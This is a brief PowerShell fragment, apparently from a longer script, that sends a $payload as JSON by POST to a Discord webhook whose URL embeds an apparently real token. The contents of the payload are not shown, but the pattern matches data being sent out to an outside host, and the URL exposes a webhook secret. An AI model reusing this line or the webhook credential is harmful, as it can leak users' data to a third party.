...
"@
            ...
            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1396157014153105491/by-CLNb-vJQiFtLqHslZsb3jkb3yYfBzkJrFKX_7an4sli6CmLdYQq4vbV0eUkSjDyum" -Method Post -Body $payload -ContentType 'application/json'
